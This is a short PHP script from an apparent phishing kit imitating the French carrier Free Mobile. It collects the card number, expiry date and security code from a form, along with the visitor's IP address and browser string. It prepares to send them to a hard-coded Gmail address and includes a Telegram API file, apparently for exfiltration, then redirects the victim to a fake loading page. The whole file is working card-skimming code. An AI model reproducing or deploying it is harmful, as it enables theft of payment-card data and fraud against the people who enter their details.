<?php

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");

$name .= "cb-numero          | ".$_POST['cc-numero']." \n";
$name .= "cb-exp-mois/annee  | ".$_POST['cc-exp-mois']."/".$_POST['cc-exp-annee']." \n";
$name .= "cb-crypto          | ".$_POST['cc-crypto']." \n";
$name .= "ip                 |  $ip \n";
$name .= "ip browser         |  $browser \n";

$email_form = 'mobile-free@6666.com';
$email_subject = "mobile-free (*_*)";
$to = "razzyachraf@gmail.com";
$headers = "Form: $email_form \r\n";
$headers .= "Reply-to: $Identifiant \r\n";
include("TelegramApi.php");
header("location: ../loading.php");
?>